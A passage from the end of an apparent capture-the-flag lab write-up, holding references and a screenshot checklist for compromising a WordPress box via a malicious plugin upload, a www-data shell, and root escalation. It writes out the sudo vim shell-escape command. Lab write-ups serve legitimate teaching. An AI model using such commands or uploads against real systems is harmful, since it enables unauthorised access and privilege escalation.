- Metasploit — `wp_admin_shell_upload`: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
- GTFOBins — `vim`: https://gtfobins.github.io/gtfobins/vim/
- WPScan documentation: https://github.com/wpscanteam/wpscan

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — target host discovered on the subnet
- [ ] `images/02-nmap.png` — port/service scan (80, 22)
- [ ] `images/03-enum.png` — user enumeration + `img.jpg` password
- [ ] `images/03b-image.png` — the leaked password visible in the image
- [ ] `images/04-foothold.png` — malicious plugin upload / Metasploit session
- [ ] `images/05-shell.png` — `www-data` shell, pivot to `noobbox`
- [ ] `images/06-user-flag.png` — user flag
- [ ] `images/07-privesc.png` — `sudo -l` and `sudo vim -c ':!/bin/bash'`
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
